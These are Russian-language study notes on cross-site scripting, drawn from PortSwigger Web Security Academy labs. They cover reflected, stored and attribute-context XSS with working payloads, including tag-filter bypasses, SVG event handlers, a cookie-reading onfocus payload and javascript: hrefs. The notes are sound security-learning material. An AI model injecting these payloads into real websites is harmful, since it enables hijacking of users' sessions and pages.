[Cross-site scripting](https://portswigger.net/web-security/cross-site-scripting)

[Cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

## XSS PoC
`alert(document.domain)` or `print()`

## Reflected XSS
Функция поиска, которая получает поисковый запрос от пользователя в параметре URL:
`https://insecure-website.com/search?term=gift`

`<p>You searched for: gift</p>`

Эксплуатация:
`https://insecure-website.com/search?term=<script>/*+Bad+stuff+here...+*/</script>`

`<p>You searched for: <script>/* Bad stuff here... */</script></p>`

### XSS между тегами HTML
Когда контекст XSS представляет собой текст между тегами HTML, необходимо ввести несколько новых тегов HTML, предназначенных для запуска выполнения JavaScript.

[Reflected XSS into HTML context with most tags and attributes blocked](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked)

`<iframe src="https://your-lab-id.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>`

[Reflected XSS into HTML context with all tags blocked except custom ones](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-all-standard-tags-blocked)

`<script> location = 'https://your-lab-id.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x'; </script>`

[Reflected XSS with some SVG markup allowed](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-some-svg-markup-allowed)

`"><svg><animatetransform onbegin=alert(1)>`

### XSS в атрибутах тегов HTML
Когда контекст XSS находится в значении атрибута HTML-тега, иногда можно прервать значение атрибута, закрыть тег и ввести новый. Например:

`"><script>alert(document.domain)</script>`

Чаще всего в такой ситуации угловые скобки блокируются или кодируются, поэтому ваш ввод не может выйти за пределы тега, в котором он появляется. При условии, что вы можете прервать значение атрибута, вы можете ввести новый атрибут, который создает контекст, доступный для сценария, например, обработчик события. Например:

`" autofocus onfocus=alert(document.domain) x="`

Приведенная выше полезная нагрузка создает событие `onfocus`, которое будет выполнять JavaScript, когда элемент получает фокус, а также добавляет атрибут `autofocus`, чтобы попытаться вызвать событие `onfocus` автоматически без какого-либо взаимодействия с пользователем. Наконец, он добавляет `x="`, чтобы изящно исправить следующую разметку. 

Вы можете встретить сайты, которые кодируют угловые скобки, но при этом позволяют вводить атрибуты. Иногда такие инъекции возможны даже в тегах, которые обычно не вызывают автоматических событий, например, в каноническом теге. Это поведение можно использовать с помощью ключей доступа и взаимодействия с пользователем в Chrome. Ключи доступа позволяют создавать комбинации клавиш, которые ссылаются на определенный элемент. Атрибут `accesskey` позволяет определить букву, при нажатии которой в сочетании с другими клавишами (они различаются для разных платформ) будут происходить события. В следующем уроке вы сможете поэкспериментировать с ключами доступа и использовать канонический тег. 



## Stored XSS
Веб-сайт позволяет пользователям оставлять комментарии к записям в блоге, которые отображаются другим пользователям. Пользователи отправляют комментарии с помощью HTTP-запроса, как показано ниже: 
`POST /post/comment HTTP/1.1`
`Host: vulnerable-website.com`
`Content-Length: 100` 

`postId=3&comment=This+post+was+extremely+helpful.&name=Carlos+Montoya&email=carlos%40normal-user.net`

После отправки этого комментария любой пользователь, который посетит эту запись в блоге, получит в ответе приложения следующее:
`<p>This post was extremely helpful.</p>`

`<script>/* Bad stuff here... */</script>`

Эксплуатация:
`comment=%3Cscript%3E%2F*%2BBad%2Bstuff%2Bhere...%2B*%2F%3C%2Fscript%3E`

`<p><script>/* Bad stuff here... */</script></p>`

### XSS в атрибутах тегов HTML
Иногда XSS-контекст заключается в атрибуте HTML-тега, который сам по себе может создавать контекст для сценариев. Здесь можно выполнить JavaScript без необходимости завершать значение атрибута. Например, если контекст XSS находится в атрибуте `href` тега якоря, вы можете использовать псевдопротокол `javascript` для выполнения сценария. Например:

`<a href="javascript:alert(document.domain)">`



## DOM-based XSS
